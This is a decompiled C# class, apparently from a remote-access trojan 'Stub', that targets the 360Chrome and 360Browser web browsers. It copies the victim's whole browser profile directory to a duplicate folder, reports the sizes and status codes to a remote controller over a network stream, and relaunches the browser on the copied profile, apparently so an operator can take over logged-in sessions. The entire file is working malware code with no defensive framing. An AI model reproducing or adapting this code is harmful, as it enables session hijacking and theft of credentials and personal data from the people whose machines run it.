using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stub
{
	// Token: 0x02000053 RID: 83
	public class GClass5
	{
		// Token: 0x06000115 RID: 277 RVA: 0x00006C18 File Offset: 0x00004E18
		public static void smethod_0(bool bool_0)
		{
			Computer computer = new Computer();
			bool flag = true;
			if (File.Exists(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\Application\\360chrome.exe"))
			{
				if (!Conversions.ToBoolean(GClass0.smethod_3(new FileInfo(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data - Copy\\lockfile"))))
				{
					if (bool_0)
					{
						GClass0.smethod_2(GClass0.networkStream_0, "22|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data") / 1024.0 / 1024.0)));
						GClass2 gclass = new GClass2();
						gclass.method_0(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data - Copy");
						try
						{
							computer.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data", Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data - Copy", true);
						}
						catch (Exception ex)
						{
						}
						gclass.method_2();
						GClass0.smethod_2(GClass0.networkStream_0, "24|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\User Data") / 1024.0 / 1024.0)));
					}
					try
					{
						Process.Start(Interaction.Environ("localappdata") + "\\360Chrome\\Chrome\\Application\\360chrome.exe", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "360Chrome\\Chrome\\User Data - Copy");
						return;
					}
					catch (Exception ex2)
					{
						return;
					}
				}
				GClass0.smethod_2(GClass0.networkStream_0, "25|360 has already been opened!");
				return;
			}
			if (flag != File.Exists(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\Application\\360Browser.exe"))
			{
				return;
			}
			if (!Conversions.ToBoolean(GClass0.smethod_3(new FileInfo(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data - Copy\\lockfile"))))
			{
				if (bool_0)
				{
					GClass0.smethod_2(GClass0.networkStream_0, "22|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data") / 1024.0 / 1024.0)));
					GClass2 gclass2 = new GClass2();
					gclass2.method_0(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data - Copy");
					try
					{
						computer.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data", Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data - Copy", true);
					}
					catch (Exception ex3)
					{
					}
					gclass2.method_2();
					GClass0.smethod_2(GClass0.networkStream_0, "24|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\User Data") / 1024.0 / 1024.0)));
				}
				try
				{
					Process.Start(Interaction.Environ("localappdata") + "\\360Browser\\Browser\\Application\\360Browser.exe", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "360Browser\\Browser\\User Data - Copy");
					return;
				}
				catch (Exception ex4)
				{
					return;
				}
			}
			GClass0.smethod_2(GClass0.networkStream_0, "25|360 has already been opened!");
		}
	}
}
